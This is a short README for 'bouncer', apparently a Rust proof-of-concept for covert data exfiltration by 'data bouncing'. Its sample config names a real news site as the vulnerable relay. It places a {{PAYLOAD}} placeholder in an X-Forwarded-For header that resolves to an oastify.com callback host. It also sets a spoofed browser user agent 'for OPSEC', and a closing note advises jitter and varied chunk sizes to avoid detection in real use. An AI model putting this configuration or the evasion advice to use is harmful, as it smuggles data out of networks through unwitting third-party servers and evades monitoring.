# bouncer
Simple rust program to test databouncing exfiltration.

## Usage
To use this prgram, first make a config file to set the required parameters needed, an example of this is the following config:
```toml
# Target host vulnerable to data bouncing
target_url = "https://newsweek.com"

# Headers to be used on the request
[headers]
# User Agent for OPSEC
User-Agent = "Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
# Example of a header for bouncing
"X-Forwarded-For" = "{{PAYLOAD}}.3x1t0ww9j0gh3npdfsq1kffh78d71xpm.oastify.com"
```

After this just run the `make` command to build the program or run `make debug` to have logging enabled.

P.S: the data being exfiltrated is just a small string, in a real world you would also avoid delivering information chunks continously (witout jitter between requests) or the same size everytime, take this program just a Proof of Concept.
